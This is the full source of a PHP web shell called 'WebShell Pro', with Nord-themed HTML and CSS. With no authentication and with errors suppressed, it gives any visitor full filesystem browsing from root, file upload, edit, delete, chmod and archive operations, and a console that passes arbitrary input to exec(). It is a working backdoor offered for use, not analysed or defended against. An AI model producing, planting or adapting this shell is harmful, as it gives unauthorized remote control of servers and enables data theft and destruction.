<?php
// =============================================
// WEBSHELL PRO - Full Feature
// Nord Theme | Mobile Friendly
// =============================================

error_reporting(0);
ini_set('display_errors', 0);
session_start();

// ========== KONFIGURASI ==========
$root_path = $_SERVER['DOCUMENT_ROOT']; // Ubah ke __DIR__ kalo mau batasi akses
$current_path = isset($_GET['path']) ? $_GET['path'] : (isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $root_path);

// Validasi path
if (isset($_GET['path'])) {
    if ($_GET['path'][0] !== '/') $_GET['path'] = '/' . $_GET['path'];
    $real_path = realpath($_GET['path']);
    if ($real_path && is_dir($real_path)) {
        $current_path = $real_path;
        $_SESSION['current_path'] = $current_path;
    } else {
        $current_path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $root_path;
    }
}

// ========== FUNGSI ==========
function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    if ($bytes > 1) return $bytes . ' bytes';
    if ($bytes == 1) return '1 byte';
    return '0 bytes';
}

function get_file_icon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '⚡',
        'txt' => '📄', 'log' => '📋', 'json' => '📊', 'xml' => '📑',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'webp' => '🖼️', 'svg' => '🖼️', 'ico' => '🖼️',
        'zip' => '📦', 'rar' => '📦', 'tar' => '📦', 'gz' => '📦',
        'pdf' => '📕', 'doc' => '📘', 'docx' => '📘', 'xls' => '📗',
        'sql' => '🗄️', 'sh' => '⚙️', 'py' => '🐍', 'rb' => '💎',
        'md' => '📝', 'yml' => '⚙️', 'yaml' => '⚙️', 'htaccess' => '🔒'
    ];
    return $icons[$ext] ?? '📄';
}

function is_image($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'ico']);
}

// ========== HANDLE ACTIONS ==========

// 1. Download
if (isset($_GET['download'])) {
    $file = $current_path . '/' . $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// 2. Preview Image
if (isset($_GET['view']) && is_image($_GET['view'])) {
    $file = $current_path . '/' . $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: ' . mime_content_type($file));
        readfile($file);
        exit;
    }
}

// 3. Delete (single & multi)
if (isset($_POST['delete_files']) && isset($_POST['selected_files'])) {
    $selected = $_POST['selected_files'];
    if (is_array($selected)) {
        foreach ($selected as $item) {
            $target = $current_path . '/' . $item;
            if (file_exists($target)) {
                if (is_file($target)) @unlink($target);
                elseif (is_dir($target)) @rmdir($target);
            }
        }
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

if (isset($_GET['delete'])) {
    $target = $current_path . '/' . $_GET['delete'];
    if (file_exists($target)) {
        if (is_file($target)) @unlink($target);
        elseif (is_dir($target)) @rmdir($target);
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 4. Rename
if (isset($_POST['rename_file']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_path . '/' . $_POST['old_name'];
    $new = $current_path . '/' . $_POST['new_name'];
    if (file_exists($old) && !file_exists($new)) @rename($old, $new);
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 5. Edit Save
if (isset($_POST['save_edit']) && isset($_POST['filename']) && isset($_POST['content'])) {
    $file = $current_path . '/' . $_POST['filename'];
    if (is_file($file) && is_writable($file)) @file_put_contents($file, $_POST['content']);
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 6. Create Folder
if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $folder_name = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['folder_name']);
    if (!empty($folder_name)) {
        $new_path = $current_path . '/' . $folder_name;
        if (!file_exists($new_path)) @mkdir($new_path, 0755);
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 7. Upload
if (isset($_POST['upload_file']) && isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
    $target = $current_path . '/' . basename($_FILES['file']['name']);
    @move_uploaded_file($_FILES['file']['tmp_name'], $target);
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 8. Chmod
if (isset($_POST['chmod_file']) && isset($_POST['chmod_permission'])) {
    $file = $current_path . '/' . $_POST['chmod_file'];
    $perm = octdec(str_pad($_POST['chmod_permission'], 4, '0', STR_PAD_LEFT));
    if (file_exists($file)) @chmod($file, $perm);
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 9. Zip
if (isset($_GET['zip'])) {
    $folder = $current_path . '/' . $_GET['zip'];
    if (is_dir($folder)) {
        $zip_name = basename($folder) . '.zip';
        $zip_path = $current_path . '/' . $zip_name;
        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($folder),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($folder) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
            $zip->close();
        }
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 10. Unzip
if (isset($_POST['unzip_file'])) {
    $zip_file = $current_path . '/' . $_POST['unzip_file'];
    if (file_exists($zip_file) && is_file($zip_file)) {
        $zip = new ZipArchive();
        if ($zip->open($zip_file) === TRUE) {
            $zip->extractTo($current_path);
            $zip->close();
        }
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// 11. Console
if (isset($_POST['run_command']) && isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = [];
    $return_var = 0;
    @exec($command . ' 2>&1', $output, $return_var);
    $_SESSION['cmd'] = $command;
    $_SESSION['output'] = implode("\n", $output);
    $_SESSION['return'] = $return_var;
    header('Location: ?path=' . urlencode($current_path) . '&console=1');
    exit;
}

// 12. Search
$search_results = [];
if (isset($_GET['search']) && !empty($_GET['search'])) {
    $search_term = $_GET['search'];
    $items = @scandir($current_path);
    if ($items) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            if (stripos($item, $search_term) !== false) {
                $search_results[] = $item;
            }
        }
    }
}

// Get directory contents
$folders = [];
$files = [];
if (is_dir($current_path)) {
    $items = @scandir($current_path);
    if ($items) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_item = $current_path . '/' . $item;
            if (is_dir($full_item)) $folders[] = $item;
            else $files[] = $item;
        }
        sort($folders);
        sort($files);
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WebShell Pro</title>
    <style>
        /* ========== RESET & BASE ========== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'JetBrains Mono', monospace;
            background: #2e3440;
            padding: 15px;
            color: #d8dee9;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        /* ========== HEADER ========== */
        .header {
            background: #3b4252;
            border-radius: 8px 8px 0 0;
            padding: 20px;
            border-bottom: 2px solid #4c566a;
        }
        h1 {
            font-size: 26px;
            color: #88c0d0;
            margin-bottom: 10px;
        }
        h1 span {
            background: #5e81ac;
            color: #eceff4;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 13px;
            margin-left: 10px;
        }
        .current-path {
            background: #2e3440;
            padding: 10px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: #88c0d0;
            margin: 12px 0;
            word-break: break-all;
            border: 1px solid #4c566a;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-top: 8px;
            padding: 6px 8px;
            background: #2e3440;
            border-radius: 4px;
        }
        .breadcrumb a {
            background: #434c5e;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 11px;
            text-decoration: none;
            color: #d8dee9;
        }
        .breadcrumb a:hover { background: #4c566a; }
        .breadcrumb span { color: #4c566a; }
        
        /* ========== NAV BUTTONS ========== */
        .nav-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
            align-items: center;
        }
        .nav-btn {
            background: #434c5e;
            padding: 8px 15px;
            border-radius: 5px;
            text-decoration: none;
            color: #d8dee9;
            font-size: 14px;
            transition: all 0.2s;
            border: none;
            cursor: pointer;
            display: inline-block;
        }
        .nav-btn:hover { background: #4c566a; transform: translateY(-1px); }
        .nav-btn.primary { background: #5e81ac; }
        .nav-btn.primary:hover { background: #81a1c1; }
        
        .go-to-form {
            display: flex;
            gap: 5px;
            align-items: center;
            flex: 1;
            margin-left: auto;
        }
        .go-to-input {
            flex: 1;
            padding: 6px 12px;
            background: #2e3440;
            border: 1px solid #4c566a;
            border-radius: 4px;
            color: #d8dee9;
            font-family: monospace;
            min-width: 150px;
        }
        .go-to-input:focus { outline: none; border-color: #88c0d0; }
        
        /* ========== ACTIONS ========== */
        .actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 15px;
            padding: 12px 15px;
            background: #434c5e;
            border-radius: 5px;
        }
        .action-form {
            display: inline-flex;
            gap: 5px;
            align-items: center;
            flex-wrap: wrap;
        }
        .action-form input[type="file"],
        .action-form input[type="text"] {
            padding: 6px 12px;
            background: #2e3440;
            border: 1px solid #4c566a;
            border-radius: 4px;
            color: #d8dee9;
            font-size: 13px;
        }
        .action-form input[type="file"] { color: #4c566a; }
        .action-form button {
            padding: 6px 14px;
            background: #5e81ac;
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 13px;
        }
        .action-form button:hover { background: #81a1c1; transform: translateY(-1px); }
        
        /* ========== SEARCH ========== */
        .search-bar {
            display: flex;
            gap: 8px;
            margin-bottom: 15px;
            padding: 10px 15px;
            background: #434c5e;
            border-radius: 5px;
        }
        .search-bar input {
            flex: 1;
            padding: 6px 12px;
            background: #2e3440;
            border: 1px solid #4c566a;
            border-radius: 4px;
            color: #d8dee9;
            font-size: 13px;
        }
        .search-bar input:focus { outline: none; border-color: #88c0d0; }
        .search-bar button {
            padding: 6px 16px;
            background: #a3be8c;
            border: none;
            border-radius: 4px;
            color: #2e3440;
            cursor: pointer;
            font-weight: bold;
        }
        .search-bar button:hover { background: #b0c9a0; }
        
        /* ========== TABLE ========== */
        .main-layout {
            background: #3b4252;
            border-radius: 0 0 8px 8px;
            overflow: hidden;
        }
        .file-browser {
            background: #3b4252;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 650px;
        }
        th, td {
            text-align: left;
            padding: 10px 12px;
            border-bottom: 1px solid #4c566a;
            font-size: 13px;
        }
        th {
            background: #434c5e;
            font-weight: 600;
            color: #88c0d0;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        tr:hover td { background: #434c5e; }
        .folder-row { background: #2e3440; }
        .parent-row { background: #434c5e; font-weight: bold; }
        .folder-link {
            text-decoration: none;
            color: #88c0d0;
            font-weight: 500;
        }
        .folder-link:hover { color: #8fbcbb; text-decoration: underline; }
        .file-name { color: #d8dee9; }
        
        /* ========== ACTION BUTTONS ========== */
        .action-buttons {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }
        .btn-small {
            padding: 3px 8px;
            font-size: 11px;
            text-decoration: none;
            border-radius: 3px;
            display: inline-block;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-small:hover { transform: translateY(-1px); opacity: 0.9; }
        .btn-edit { background: #a3be8c; color: #2e3440; }
        .btn-delete { background: #bf616a; color: white; }
        .btn-download { background: #81a1c1; color: #2e3440; }
        .btn-rename { background: #ebcb8b; color: #2e3440; }
        .btn-view { background: #b48ead; color: #2e3440; }
        .btn-zip { background: #d08770; color: #2e3440; }
        .btn-unzip { background: #8fbcbb; color: #2e3440; }
        .btn-chmod { background: #5e81ac; color: white; }
        
        /* ========== CHECKBOX ========== */
        .checkbox { width: 18px; height: 18px; cursor: pointer; accent-color: #88c0d0; }
        
        /* ========== PAGE CONTAINER ========== */
        .page-container {
            background: #3b4252;
            border-radius: 8px;
            padding: 25px;
            max-width: 900px;
            margin: 0 auto;
        }
        .page-container h2 {
            color: #88c0d0;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #4c566a;
        }
        .page-container input, 
        .page-container textarea,
        .page-container select {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            background: #2e3440;
            border: 1px solid #4c566a;
            border-radius: 4px;
            color: #d8dee9;
            font-family: 'JetBrains Mono', monospace;
        }
        .page-container textarea {
            min-height: 400px;
            resize: vertical;
        }
        .page-container button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background: #5e81ac;
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            font-size: 14px;
        }
        .page-container button:hover { background: #81a1c1; }
        .back-link {
            display: inline-block;
            margin-top: 15px;
            color: #88c0d0;
            text-decoration: none;
        }
        .back-link:hover { color: #8fbcbb; text-decoration: underline; }
        
        /* ========== CONSOLE ========== */
        .console-output-box {
            background: #2e3440;
            padding: 15px;
            border-radius: 5px;
            margin: 12px 0;
            max-height: 500px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        .console-line { padding: 5px; border-bottom: 1px solid #4c566a; }
        .output-text { color: #a3be8c; white-space: pre-wrap; }
        .error-text { color: #bf616a; }
        
        /* ========== MULTI DELETE ========== */
        .multi-delete-form {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
            padding: 8px 12px;
            background: #2e3440;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        .multi-delete-form button {
            padding: 4px 16px;
            background: #bf616a;
            border: none;
            border-radius: 3px;
            color: white;
            cursor: pointer;
        }
        .multi-delete-form button:hover { background: #d46f78; }
        .select-all { cursor: pointer; }
        
        /* ========== RESPONSIVE ========== */
        @media (max-width: 768px) {
            body { padding: 8px; }
            .header { padding: 15px; }
            h1 { font-size: 20px; }
            h1 span { font-size: 10px; margin-left: 5px; }
            .nav-buttons { flex-direction: column; align-items: stretch; }
            .nav-btn { text-align: center; }
            .go-to-form { margin-left: 0 !important; flex-direction: column; width: 100%; }
            .go-to-input { width: 100%; }
            .actions { flex-direction: column; padding: 10px; }
            .action-form { width: 100%; flex-direction: column; }
            .action-form input[type="file"],
            .action-form input[type="text"] { width: 100%; }
            .action-form button { width: 100%; }
            .search-bar { flex-direction: column; }
            .search-bar button { width: 100%; }
            table { min-width: 550px; font-size: 12px; }
            th, td { padding: 6px 8px; }
            .btn-small { font-size: 9px; padding: 2px 6px; }
            .page-container { padding: 15px; margin: 0 5px; }
            .page-container textarea { min-height: 250px; }
            .multi-delete-form { flex-direction: column; align-items: stretch; }
            .console-output-box { max-height: 300px; font-size: 11px; }
            .breadcrumb a { font-size: 9px; padding: 2px 6px; }
            .current-path { font-size: 11px; }
        }
        
        @media (max-width: 480px) {
            h1 { font-size: 17px; text-align: center; }
            table { min-width: 450px; font-size: 11px; }
            th, td { padding: 4px 6px; }
            .btn-small { font-size: 8px; padding: 2px 5px; }
            .page-container textarea { min-height: 180px; font-size: 12px; }
            .checkbox { width: 16px; height: 16px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- ========== HEADER ========== -->
        <div class="header">
            <h1>⚡ WebShell <span>Pro</span></h1>
            <div class="current-path">
                📂 Current: <?= htmlspecialchars($current_path) ?>
                <div class="breadcrumb">
                    <a href="?path=/">🏠 /</a>
                    <?php 
                    $parts = explode('/', trim($current_path, '/'));
                    $build = '';
                    foreach ($parts as $part):
                        if (empty($part)) continue;
                        $build .= '/' . $part;
                    ?>
                        <span>›</span>
                        <a href="?path=<?= urlencode($build) ?>">📁 <?= htmlspecialchars($part) ?></a>
                    <?php endforeach; ?>
                </div>
            </div>
            
            <div class="nav-buttons">
                <?php $parent = dirname($current_path); if ($parent != $current_path): ?>
                <a href="?path=<?= urlencode($parent) ?>" class="nav-btn">⬆️ Up One Directory</a>
                <?php endif; ?>
                <a href="?path=/" class="nav-btn primary">🏠 Root (/)</a>
                <a href="?path=<?= urlencode($current_path) ?>&console=1" class="nav-btn primary">💻 Console</a>
                <form method="GET" class="go-to-form">
                    <input type="text" name="path" class="go-to-input" placeholder="Go to path..." value="<?= htmlspecialchars($current_path) ?>">
                    <button type="submit" class="nav-btn primary">🔍 Go</button>
                </form>
            </div>
            
            <div class="actions">
                <form method="POST" class="action-form" enctype="multipart/form-data">
                    <input type="file" name="file" required>
                    <button type="submit" name="upload_file">📤 Upload</button>
                </form>
                <form method="POST" class="action-form">
                    <input type="text" name="folder_name" placeholder="Folder name" required>
                    <button type="submit" name="create_folder">📁 Create</button>
                </form>
            </div>
            
            <!-- ========== SEARCH ========== -->
            <div class="search-bar">
                <form method="GET" style="display:flex;gap:8px;flex:1;flex-wrap:wrap;">
                    <input type="hidden" name="path" value="<?= urlencode($current_path) ?>">
                    <input type="text" name="search" placeholder="🔍 Search files..." value="<?= htmlspecialchars($_GET['search'] ?? '') ?>" style="flex:1;min-width:120px;">
                    <button type="submit">Search</button>
                    <?php if (isset($_GET['search'])): ?>
                        <a href="?path=<?= urlencode($current_path) ?>" class="nav-btn" style="background:#bf616a;">✕ Clear</a>
                    <?php endif; ?>
                </form>
            </div>
        </div>
        
        <!-- ========== PAGE: EDIT ========== -->
        <?php if (isset($_GET['edit']) && isset($_GET['file'])): 
            $edit_file = $current_path . '/' . $_GET['file'];
            $file_content = '';
            if (is_file($edit_file) && is_readable($edit_file)) {
                $file_size = filesize($edit_file);
                $file_content = $file_size <= 5242880 ? @file_get_contents($edit_file) : "// File too large (max 5MB)\n// Size: " . format_size($file_size);
            }
        ?>
            <div class="page-container">
                <h2>✏️ Edit: <?= htmlspecialchars($_GET['file']) ?></h2>
                <form method="POST">
                    <input type="hidden" name="filename" value="<?= htmlspecialchars($_GET['file']) ?>">
                    <textarea name="content"><?= htmlspecialchars($file_content) ?></textarea>
                    <button type="submit" name="save_edit">💾 Save</button>
                </form>
                <a href="?path=<?= urlencode($current_path) ?>" class="back-link">← Back</a>
            </div>
            
        <!-- ========== PAGE: RENAME ========== -->
        <?php elseif (isset($_GET['rename']) && isset($_GET['file'])): ?>
            <div class="page-container">
                <h2>✏️ Rename: <?= htmlspecialchars($_GET['file']) ?></h2>
                <form method="POST">
                    <input type="hidden" name="old_name" value="<?= htmlspecialchars($_GET['file']) ?>">
                    <label>New Name:</label>
                    <input type="text" name="new_name" value="<?= htmlspecialchars($_GET['file']) ?>" required autofocus>
                    <button type="submit" name="rename_file">💾 Save</button>
                </form>
                <a href="?path=<?= urlencode($current_path) ?>" class="back-link">← Back</a>
            </div>
            
        <!-- ========== PAGE: CHMOD ========== -->
        <?php elseif (isset($_GET['chmod']) && isset($_GET['file'])): 
            $chmod_file = $current_path . '/' . $_GET['file'];
            $current_perm = file_exists($chmod_file) ? substr(sprintf('%o', fileperms($chmod_file)), -4) : '0755';
        ?>
            <div class="page-container">
                <h2>🔒 Chmod: <?= htmlspecialchars($_GET['file']) ?></h2>
                <p>Current permission: <strong><?= $current_perm ?></strong></p>
                <form method="POST">
                    <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($_GET['file']) ?>">
                    <label>New Permission (ex: 0755, 0644, 0777):</label>
                    <input type="text" name="chmod_permission" value="<?= $current_perm ?>" required pattern="[0-7]{4}" placeholder="0755">
                    <button type="submit" name="chmod_file_submit">🔒 Apply Chmod</button>
                </form>
                <a href="?path=<?= urlencode($current_path) ?>" class="back-link">← Back</a>
            </div>
            
        <!-- ========== PAGE: CONSOLE ========== -->
        <?php elseif (isset($_GET['console'])): ?>
            <div class="page-container">
                <h2>💻 Console</h2>
                <div class="console-output-box">
                    <?php if (isset($_SESSION['output'])): ?>
                        <div class="console-line"><span style="color:#88c0d0;">$ <?= htmlspecialchars($_SESSION['cmd']) ?></span></div>
                        <div class="console-line"><pre class="output-text <?= $_SESSION['return'] !== 0 ? 'error-text' : '' ?>"><?= htmlspecialchars($_SESSION['output']) ?></pre></div>
                        <div class="console-line"><span style="color:#4c566a;">Exit: <?= $_SESSION['return'] ?></span></div>
                    <?php else: ?>
                        <div class="console-line"><span style="color:#4c566a;">No commands yet</span></div>
                    <?php endif; ?>
                </div>
                <form method="POST">
                    <input type="text" name="command" placeholder="ls -la, pwd, whoami, df -h, cat file.txt" autocomplete="off" style="width:100%;padding:10px;">
                    <button type="submit" name="run_command">▶️ Execute</button>
                </form>
                <a href="?path=<?= urlencode($current_path) ?>" class="back-link">← Back</a>
            </div>
            
        <!-- ========== PAGE: MAIN FILE BROWSER ========== -->
        <?php else: ?>
            <div class="main-layout">
                <div class="file-browser">
                    <!-- Multi Delete -->
                    <form method="POST" class="multi-delete-form" onsubmit="return confirm('Delete selected items?')">
                        <input type="checkbox" class="select-all" onclick="toggleAll(this)">
                        <span style="font-size:12px;color:#4c566a;">Select All</span>
                        <button type="submit" name="delete_files">🗑️ Delete Selected</button>
                    </form>
                    
                    <table>
                        <thead>
                            <tr>
                                <th style="width:30px;"></th>
                                <th>Name</th>
                                <th style="width:80px;">Size</th>
                                <th style="width:150px;">Modified</th>
                                <th style="min-width:300px;">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <!-- Parent -->
                            <?php if ($current_path != '/'): 
                                $parent = dirname($current_path);
                            ?>
                            <tr class="parent-row">
                                <td></td>
                                <td><a href="?path=<?= urlencode($parent) ?>" class="folder-link" style="color:#ebcb8b;">📂 .. (Parent)</a></td>
                                <td>-</td>
                                <td>-</td>
                                <td>-</td>
                            </tr>
                            <?php endif; ?>
                            
                            <!-- Search Results or Normal -->
                            <?php 
                            $display_items = isset($_GET['search']) && !empty($_GET['search']) ? $search_results : array_merge($folders, $files);
                            if (empty($display_items)): 
                            ?>
                            <tr>
                                <td colspan="5" style="text-align:center;padding:40px;color:#4c566a;">📂 Empty directory</td>
                            </tr>
                            <?php else: 
                                foreach ($display_items as $item):
                                    $full_path = $current_path . '/' . $item;
                                    $is_dir = is_dir($full_path);
                                    $icon = $is_dir ? '📁' : get_file_icon($item);
                                    $size = $is_dir ? '-' : format_size(@filesize($full_path));
                                    $modified = date('Y-m-d H:i:s', @filemtime($full_path));
                                    $is_image = !$is_dir && is_image($item);
                                    $is_zip = !$is_dir && pathinfo($item, PATHINFO_EXTENSION) == 'zip';
                            ?>
                            <tr class="<?= $is_dir ? 'folder-row' : '' ?>">
                                <td>
                                    <input type="checkbox" name="selected_files[]" value="<?= htmlspecialchars($item) ?>" class="file-checkbox">
                                </td>
                                <td>
                                    <?php if ($is_dir): ?>
                                        <a href="?path=<?= urlencode($full_path) ?>" class="folder-link">
                                            <?= $icon ?> <?= htmlspecialchars($item) ?>/
                                        </a>
                                    <?php else: ?>
                                        <span class="file-name"><?= $icon ?> <?= htmlspecialchars($item) ?></span>
                                    <?php endif; ?>
                                </td>
                                <td><?= $size ?></td>
                                <td><?= $modified ?></td>
                                <td class="action-buttons">
                                    <!-- Edit (file only) -->
                                    <?php if (!$is_dir): ?>
                                        <a href="?path=<?= urlencode($current_path) ?>&edit=1&file=<?= urlencode($item) ?>" class="btn-small btn-edit">✏️ Edit</a>
                                    <?php endif; ?>
                                    
                                    <!-- Rename -->
                                    <a href="?path=<?= urlencode($current_path) ?>&rename=1&file=<?= urlencode($item) ?>" class="btn-small btn-rename">✏️ Rename</a>
                                    
                                    <!-- Delete -->
                                    <a href="?path=<?= urlencode($current_path) ?>&delete=<?= urlencode($item) ?>" class="btn-small btn-delete" onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">🗑️</a>
                                    
                                    <!-- Download (file only) -->
                                    <?php if (!$is_dir): ?>
                                        <a href="?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>" class="btn-small btn-download">⬇️</a>
                                    <?php endif; ?>
                                    
                                    <!-- View Image (file only) -->
                                    <?php if ($is_image): ?>
                                        <a href="?path=<?= urlencode($current_path) ?>&view=<?= urlencode($item) ?>" target="_blank" class="btn-small btn-view">🖼️</a>
                                    <?php endif; ?>
                                    
                                    <!-- Zip (folder only) -->
                                    <?php if ($is_dir): ?>
                                        <a href="?path=<?= urlencode($current_path) ?>&zip=<?= urlencode($item) ?>" class="btn-small btn-zip" onclick="return confirm('Zip <?= htmlspecialchars($item) ?>?')">📦 Zip</a>
                                    <?php endif; ?>
                                    
                                    <!-- Unzip (zip file only) -->
                                    <?php if ($is_zip): ?>
                                        <form method="POST" style="display:inline;">
                                            <input type="hidden" name="unzip_file" value="<?= htmlspecialchars($item) ?>">
                                            <button type="submit" class="btn-small btn-unzip" onclick="return confirm('Extract <?= htmlspecialchars($item) ?>?')">📂 Unzip</button>
                                        </form>
                                    <?php endif; ?>
                                    
                                    <!-- Chmod -->
                                    <a href="?path=<?= urlencode($current_path) ?>&chmod=1&file=<?= urlencode($item) ?>" class="btn-small btn-chmod">🔒</a>
                                </td>
                            </tr>
                            <?php endforeach; endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        // Select All
        function toggleAll(master) {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            checkboxes.forEach(cb => cb.checked = master.checked);
        }
        
        // Auto-uncheck master if any unchecked
        document.querySelectorAll('.file-checkbox').forEach(cb => {
            cb.addEventListener('change', function() {
                const all = document.querySelectorAll('.file-checkbox');
                const master = document.querySelector('.select-all');
                master.checked = Array.from(all).every(c => c.checked);
            });
        });
        
        console.log('⚡ WebShell Pro Loaded!');
        console.log('📂 Path: <?= addslashes($current_path) ?>');
    </script>
</body>
</html>
